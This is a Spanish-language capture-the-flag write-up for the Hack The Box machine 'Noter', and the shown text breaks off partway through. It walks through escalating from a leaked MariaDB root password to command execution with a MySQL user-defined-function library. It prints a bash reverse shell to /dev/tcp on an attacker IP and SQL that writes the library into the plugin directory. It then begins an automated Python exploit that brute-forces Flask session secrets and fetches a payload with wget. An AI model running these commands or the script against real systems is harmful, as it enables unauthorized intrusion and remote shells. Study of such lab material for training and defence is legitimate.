+</pre><td class="rouge-code"><pre><span class="gp">svc@noter:~/app/web$</span><span class="w"> </span>netstat <span class="nt">-tulnp</span>
+<span class="go">Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      1262/python3        
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::46253                :::*                    LISTEN      221229/node         
+tcp6       0      0 :::21                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
+</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Observamos que la dirección es <code class="language-plaintext highlighter-rouge">127.0.0.1:3306</code> lo cuál indica que solo sera accesible desde la propia máquina</p></div></blockquote><p>Con está información logramos entrar con las credenciales de antes <code class="language-plaintext highlighter-rouge">DB_user:DB_password</code>, <code class="language-plaintext highlighter-rouge">root:Nildogg36</code></p><blockquote><p>En el primer caso no encontramos nada interesante</p></blockquote><blockquote><p>Pero en el segundo caso somos usuarios privilegiados, lo cuál puede ser peligroso</p></blockquote><p>Asi que enumeramos un poco para ver a que nos enfrentamos:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre><td class="rouge-code"><pre><span class="gp">svc@noter:~/app/web$</span><span class="w"> </span>mysql <span class="nt">-uroot</span> <span class="nt">-pNildogg36</span> <span class="nt">-e</span> <span class="s2">"select version();"</span>
+<span class="go">+----------------------------------+
+| version()                        |
++----------------------------------+
+| 10.3.32-MariaDB-0ubuntu0.20.04.1 |
++----------------------------------+
+</span><span class="gp">svc@noter:~/app/web$</span><span class="w"> </span>mysql <span class="nt">-uroot</span> <span class="nt">-pNildogg36</span> <span class="nt">-e</span> <span class="s2">"select user();"</span>
+<span class="go">+----------------+
+| user()         |
++----------------+
+| root@localhost |
++----------------+
+</span><span class="gp">svc@noter:~/app/web$</span><span class="w"> </span>mysql <span class="nt">-uroot</span> <span class="nt">-pNildogg36</span> <span class="nt">-e</span> <span class="s2">"show databases;"</span>
+<span class="go">+--------------------+
+| Database           |
++--------------------+
+| app                |
+| information_schema |
+| mysql              |
+| performance_schema |
+| test               |
++--------------------+
+</span></pre></table></code></div></div><p>Vemos que somos <code class="language-plaintext highlighter-rouge">root</code> y además la base de datos <code class="language-plaintext highlighter-rouge">mysql</code> que almacena los usuarios y sus privilegios, así que vemos que privilegios tenemos:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+</pre><td class="rouge-code"><pre><span class="gp">svc@noter:~/app/web$</span><span class="w"> </span>mysql <span class="nt">-uroot</span> <span class="nt">-pNildogg36</span> <span class="nt">-e</span> <span class="s2">"select * from mysql.user where user = substring_index(user(), '@', 1)"</span> <span class="nt">-E</span>                                                          <span class="o">[</span>144/144]
+<span class="go">*************************** 1. row ***************************                                                                                                                                
+                  Host: localhost                                                                                                                                                             
+                  User: root                                                                                                                                                                  
+              Password: *937440AD99CBB4A102402708AA43B689818489C8                                                                                                                             
+           Select_priv: Y                                                                      
+           Insert_priv: Y                      
+           Update_priv: Y                                                                      
+           Delete_priv: Y                                                                      
+           Create_priv: Y                                                                      
+             Drop_priv: Y                      
+           Reload_priv: Y                      
+         Shutdown_priv: Y                      
+          Process_priv: Y                      
+             File_priv: Y                      
+            Grant_priv: Y                      
+       References_priv: Y                      
+            Index_priv: Y                      
+            Alter_priv: Y                      
+          Show_db_priv: Y                      
+            Super_priv: Y                      
+ Create_tmp_table_priv: Y                      
+      Lock_tables_priv: Y                      
+          Execute_priv: Y                      
+       Repl_slave_priv: Y                      
+      Repl_client_priv: Y                      
+      Create_view_priv: Y                                                                      
+        Show_view_priv: Y                      
+   Create_routine_priv: Y                                                                      
+    Alter_routine_priv: Y                      
+      Create_user_priv: Y                                                                      
+            Event_priv: Y                      
+          Trigger_priv: Y                                                                      
+Create_tablespace_priv: Y                      
+   Delete_history_priv: Y                                                                      
+              ssl_type:                        
+            ssl_cipher:                        
+           x509_issuer:                        
+          x509_subject:                        
+         max_questions: 0                      
+           max_updates: 0                      
+       max_connections: 0                      
+  max_user_connections: 0                      
+                plugin:                        
+ authentication_string:                        
+      password_expired: N                      
+               is_role: N                      
+          default_role:                        
+    max_statement_time: 0.000000
+</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Usamos las flags <code class="language-plaintext highlighter-rouge">-e &lt;query&gt;</code> y <code class="language-plaintext highlighter-rouge">-E</code> para directamente executar una consulta y ver el output en formato vertical respectivamente</p></div></blockquote><p>En mi caso no estaba tan familiarizado con estos permisos, así que buscando en internet sobre posibles vulnerabilidades al estar registrados como <code class="language-plaintext highlighter-rouge">root</code> en una base de datos encontramos en la famosa “Biblia de Hackers” (Hacktricks) una vulnerabilidad para ejecutar comandos <strong>RCE (Remote Code Execution)</strong> por medio del concepto <strong>User-Defined function</strong> y una librería que permite comunicarse con el sistema</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre><span class="c1">-- Use a database</span>
+<span class="n">use</span> <span class="n">mysql</span><span class="p">;</span>
+<span class="c1">-- Create a table to load the library and move it to the plugins dir</span>
+<span class="k">create</span> <span class="k">table</span> <span class="n">npn</span><span class="p">(</span><span class="n">line</span> <span class="nb">blob</span><span class="p">);</span>
+<span class="c1">-- Load the binary library inside the table</span>
+<span class="c1">-- You might need to change the path and file name</span>
+<span class="k">insert</span> <span class="k">into</span> <span class="n">npn</span> <span class="k">values</span><span class="p">(</span><span class="n">load_file</span><span class="p">(</span><span class="s1">'/tmp/lib_mysqludf_sys.so'</span><span class="p">));</span>
+<span class="c1">-- Get the plugin_dir path</span>
+<span class="k">show</span> <span class="n">variables</span> <span class="k">like</span> <span class="s1">'%plugin%'</span><span class="p">;</span>
+<span class="c1">-- Supposing the plugin dir was /usr/lib/x86_64-linux-gnu/mariadb19/plugin/</span>
+<span class="c1">-- dump in there the library</span>
+<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">npn</span> <span class="k">into</span> <span class="n">dumpfile</span> <span class="s1">'/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so'</span><span class="p">;</span>
+<span class="c1">-- Create a function to execute commands</span>
+<span class="k">create</span> <span class="k">function</span> <span class="n">sys_exec</span> <span class="k">returns</span> <span class="nb">integer</span> <span class="n">soname</span> <span class="s1">'lib_mysqludf_sys.so'</span><span class="p">;</span>
+<span class="c1">-- Execute commands</span>
+<span class="k">select</span> <span class="n">sys_exec</span><span class="p">(</span><span class="s1">'id &gt; /tmp/out.txt; chmod 777 /tmp/out.txt'</span><span class="p">);</span>
+<span class="k">select</span> <span class="n">sys_exec</span><span class="p">(</span><span class="s1">'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.66/1234 0&gt;&amp;1"'</span><span class="p">);</span>
+</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Información de la vulnerabilidad en <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation">https://book.hacktricks.xyz/</a></p></div></blockquote><blockquote class="prompt-info"><div><p>Explicación mas detallada de la vulnerabilidad <a href="https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf?rss">MYSQL UDF Explotation</a></p></div></blockquote><p>Explotación:</p><blockquote><p>Antes de todo buscamos la librería maliciosa y la pasamos a la máquina víctima, para ello la buscamos en nuestra máquina con <code class="language-plaintext highlighter-rouge">locate "*lib_mysqludf*"</code> y escogemos la correcta de acuerdo al <strong>OS (Operative System)</strong> y <strong>arquitectura del objetivo (32-bit, 64-bit)</strong></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="go">❯ locate "*lib_mysqludf*"
+/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.dll
+/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.so
+/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll
+/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so
+/usr/share/sqlmap/data/udf/mysql/linux/32/lib_mysqludf_sys.so_
+/usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_
+/usr/share/sqlmap/data/udf/mysql/windows/32/lib_mysqludf_sys.dll_
+/usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_
+</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>En cualquier caso que no la encuentres puedes buscarla con <code class="language-plaintext highlighter-rouge">searchsploit mysql UDF</code> o también en la misma web <a href="https://www.exploit-db.com/exploits/1518">https://www.exploit-db.com/exploits/1518</a></p></div></blockquote><blockquote><p>Ahora Entramos como <code class="language-plaintext highlighter-rouge">root</code> a la base de datos <code class="language-plaintext highlighter-rouge">mysql</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="gp">svc@noter:~/tmp$</span><span class="w"> </span>mysql <span class="nt">-s</span> <span class="nt">-uroot</span> <span class="nt">-pNildogg36</span>
+<span class="gp">MariaDB [(none)]&gt;</span><span class="w"> </span>use mysql<span class="p">;</span>
+<span class="gp">MariaDB [mysql]&gt;</span><span class="w">
+</span></pre></table></code></div></div><blockquote><p>Creamos una tabla llamada <code class="language-plaintext highlighter-rouge">privesc</code> que tendrá un campo de tipo <code class="language-plaintext highlighter-rouge">blob</code> <strong>(tipo de dato para almacenar objetos binarios como archivos, imagenes, etc)</strong></p></blockquote><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="n">MariaDB</span> <span class="p">[</span><span class="n">mysql</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">create</span> <span class="k">table</span> <span class="n">privesc</span><span class="p">(</span><span class="n">library</span> <span class="nb">blob</span><span class="p">);</span>
+</pre></table></code></div></div><blockquote><p>Insertamos dentro de nuestra tabla la librería <code class="language-plaintext highlighter-rouge">lib_mysqludf_sys_64.so</code> con la función <code class="language-plaintext highlighter-rouge">load_file(&lt;path_file&gt;)</code></p></blockquote><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="n">MariaDB</span> <span class="p">[</span><span class="n">mysql</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">insert</span> <span class="k">into</span> <span class="n">privesc</span> <span class="k">values</span><span class="p">(</span><span class="n">load_file</span><span class="p">(</span><span class="s1">'/tmp/lib_mysqludf_sys_64.so'</span><span class="p">));</span>
+</pre></table></code></div></div><blockquote class="prompt-warning"><div><p>Tenga en cuenta pasar la ruta completa y exacta de la libería para no tener errores que te vuelen la cabeza, estamos?</p></div></blockquote><blockquote><p>Ahora debemos colocar la librería en el directorio donde se encuentran los <strong>plugins</strong> de <code class="language-plaintext highlighter-rouge">MariaDB</code> y así poder usarla</p></blockquote><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="n">MariaDB</span> <span class="p">[</span><span class="n">mysql</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">@@</span><span class="n">plugin_dir</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">---------------------------------------------+</span>
+<span class="o">|</span> <span class="o">@@</span><span class="n">plugin_dir</span>                                <span class="o">|</span>
+<span class="o">+</span><span class="c1">---------------------------------------------+</span>
+<span class="o">|</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">mariadb19</span><span class="o">/</span><span class="n">plugin</span><span class="o">/</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">---------------------------------------------+</span>
+<span class="n">MariaDB</span> <span class="p">[</span><span class="n">mysql</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">select</span> <span class="n">library</span> <span class="k">from</span> <span class="n">privesc</span> <span class="k">into</span> <span class="n">dumpfile</span> <span class="s1">'/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so'</span><span class="p">;</span>
+</pre></table></code></div></div><blockquote><p>Luego queda crear nuestra función, pero para ello debemos saber el nombre de la función, por ello usamos <code class="language-plaintext highlighter-rouge">ghidra</code> para analizar la librería</p></blockquote><p><img data-src="/assets/img/htb/writeups/noter/ghidra_udf_lib.png" alt="GHidraUdf" class="shadow" data-proofer-ignore></p><p>Filtramos por la palabra <code class="language-plaintext highlighter-rouge">sys</code> y encontramos varias funciones, de las cuales usaremos <code class="language-plaintext highlighter-rouge">sys_exec</code>. Tambien logramos ver el código gracias al <strong>conjunto de compiladoreS de GNU (GNU Compiller Collection)</strong> y observamos que la función executara el comando con la función <code class="language-plaintext highlighter-rouge">system</code> y retornará como respuesta un código de estado (0 -&gt; exitoso)</p><blockquote><p>Como ya conocemos su nombre y lo que retornará, procedemos a crear la función usando con el nombre adecuado y usando la librería</p></blockquote><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="n">MariaDB</span> <span class="p">[</span><span class="n">mysql</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">create</span> <span class="k">function</span> <span class="n">sys_exec</span> <span class="k">returns</span> <span class="nb">integer</span> <span class="n">soname</span> <span class="s1">'lib_mysqludf_sys.so'</span><span class="p">;</span>
+</pre></table></code></div></div><blockquote><p>Como último paso solo queda pasar como parámetro el comando que queremos ejecutar (e.g ‘bash -c “bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1”’)</p></blockquote><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="n">MariaDB</span> <span class="p">[</span><span class="n">mysql</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">select</span> <span class="n">sys_exec</span><span class="p">(</span><span class="s1">'{command}'</span><span class="p">);</span>
+</pre></table></code></div></div><p>Para seguir practicando hice mi primer script automatizado en <code class="language-plaintext highlighter-rouge">python</code> que te da privilegios <code class="language-plaintext highlighter-rouge">root</code> aplicando todo lo visto anteriormente:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">signal</span><span class="p">,</span> <span class="n">argparse</span><span class="p">,</span> <span class="n">json</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">hashlib</span><span class="p">,</span> <span class="n">requests</span><span class="p">,</span> <span class="n">random</span><span class="p">,</span> <span class="n">string</span><span class="p">,</span> <span class="n">subprocess</span><span class="p">,</span> <span class="n">shlex</span><span class="p">,</span> <span class="n">os</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">itsdangerous</span> <span class="kn">import</span> <span class="n">URLSafeTimedSerializer</span><span class="p">,</span> <span class="n">TimestampSigner</span><span class="p">,</span> <span class="n">BadSignature</span>
+<span class="kn">from</span> <span class="nn">flask.json.tag</span> <span class="kn">import</span> <span class="n">TaggedJSONSerializer</span>
+
+<span class="c1"># debugging
+</span><span class="kn">import</span> <span class="nn">pdb</span>
+
+<span class="c1"># ctrl + c
+</span><span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">failure</span><span class="p">(</span><span class="s">"Interruption"</span><span class="p">)</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s">'rm </span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
+
+<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>
+
+<span class="c1"># arguments
+</span><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">'Get reverse shell'</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-ip'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'ip-address to receive the shell'</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-port'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'local port to receive the shell'</span><span class="p">)</span>
+<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+<span class="c1"># global variables
+</span><span class="n">target_url</span> <span class="o">=</span> <span class="s">'http://10.10.11.160:5000'</span>
+<span class="n">target_session_payload</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">logged_in</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span><span class="n">username</span><span class="o">=</span><span class="s">'blue'</span><span class="p">)</span>
+<span class="n">file_name</span> <span class="o">=</span> <span class="s">'pwned.md'</span>
+<span class="n">lib_name</span> <span class="o">=</span> <span class="s">'lib_mysqludf_sys_64.so'</span>
+<span class="n">shell_name</span> <span class="o">=</span> <span class="s">'pwned_mysqlUDF.py'</span>
+<span class="n">commands</span> <span class="o">=</span> <span class="p">[</span><span class="s">'/usr/bin/mkdir /tmp/privesc'</span><span class="p">,</span> <span class="s">'cd /tmp/privesc; /usr/bin/wget http://{}:{}/{}'</span><span class="p">,</span> <span class="s">'/usr/bin/python3 /tmp/privesc/{} {} {}'</span><span class="p">]</span>
+
+<span class="c1"># malicious payload to rce(js)
+# - - - - - - - - - - - - - - -
+# ---js
+#
+#     ((require("child_process")).execSync("{reverse shell}"))
+#   
+# ---
+</span>
+<span class="c1"># get random string
+</span><span class="k">def</span> <span class="nf">get_random_string</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
+
+<span class="c1"># get new user cookie
+</span><span class="k">def</span> <span class="nf">get_cookie</span><span class="p">():</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">'Creating user'</span><span class="p">)</span>
+    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
+        <span class="c1"># register
+</span>        <span class="n">user</span> <span class="o">=</span> <span class="n">get_random_string</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Content-Type'</span><span class="p">:</span><span class="s">'application/x-www-form-urlencoded'</span><span class="p">}</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="s">'&amp;'</span><span class="p">.</span><span class="n">join</span><span class="p">((</span><span class="s">'name={d}'</span><span class="p">,</span> <span class="s">'email={d}@gmail.com'</span><span class="p">,</span> <span class="s">'username={d}'</span><span class="p">,</span> <span class="s">'password={d}'</span><span class="p">,</span> <span class="s">'confirm={d}'</span><span class="p">)).</span><span class="nb">format</span><span class="p">(</span><span class="n">d</span><span class="o">=</span><span class="n">user</span><span class="p">)</span>
+        <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="s">/register'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+        <span class="c1"># login
+</span>        <span class="n">data</span> <span class="o">=</span> <span class="s">'&amp;'</span><span class="p">.</span><span class="n">join</span><span class="p">((</span><span class="s">'username={d}'</span><span class="p">,</span> <span class="s">'password={d}'</span><span class="p">)).</span><span class="nb">format</span><span class="p">(</span><span class="n">d</span><span class="o">=</span><span class="n">user</span><span class="p">)</span>
+        <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="s">/login'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+        <span class="c1"># get cookie
+</span>        <span class="n">session_cookie</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="n">get_dict</span><span class="p">();</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'Username -&gt; {d} , Password -&gt; {d}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">d</span><span class="o">=</span><span class="n">user</span><span class="p">))</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">failure</span><span class="p">(</span><span class="s">'{} ocurred'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">session_cookie</span>
+
+<span class="c1"># create wordlist
+</span><span class="k">def</span> <span class="nf">load_wordlist</span><span class="p">():</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'all.txt'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+        <span class="n">wordlist</span> <span class="o">=</span> <span class="nb">file</span><span class="p">.</span><span class="n">readlines</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">wordlist</span>
+
+<span class="c1"># bruteforce new user cookie
+</span><span class="k">def</span> <span class="nf">bruteforce_cookie</span><span class="p">(</span><span class="n">wordlist</span><span class="p">):</span>
+    <span class="n">cookie</span> <span class="o">=</span> <span class="n">get_cookie</span><span class="p">()</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">'Starting Brute-force attack'</span><span class="p">)</span>
+    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">secret</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
+        <span class="n">secret</span> <span class="o">=</span> <span class="n">secret</span><span class="p">.</span><span class="n">strip</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'{}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">secret</span><span class="p">))</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">serializer</span> <span class="o">=</span> <span class="n">URLSafeTimedSerializer</span><span class="p">(</span>
+                        <span class="n">secret_key</span><span class="o">=</span><span class="n">secret</span><span class="p">,</span>
+                        <span class="n">salt</span><span class="o">=</span><span class="s">'cookie-session'</span><span class="p">,</span>
+                        <span class="n">serializer</span><span class="o">=</span><span class="n">TaggedJSONSerializer</span><span class="p">(),</span>
+                        <span class="n">signer</span><span class="o">=</span><span class="n">TimestampSigner</span><span class="p">,</span>
+                        <span class="n">signer_kwargs</span><span class="o">=</span><span class="p">{</span>
+                                <span class="s">'key_derivation'</span> <span class="p">:</span> <span class="s">'hmac'</span><span class="p">,</span>
+                                <span class="s">'digest_method'</span> <span class="p">:</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha1</span>
+                            <span class="p">}</span>
+                        <span class="p">).</span><span class="n">loads</span><span class="p">(</span><span class="n">cookie</span><span class="p">[</span><span class="s">'session'</span><span class="p">])</span>
+            <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Payload : {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">serializer</span><span class="p">))</span>
+        <span class="k">except</span> <span class="n">BadSignature</span><span class="p">:</span>
+            <span class="k">continue</span>
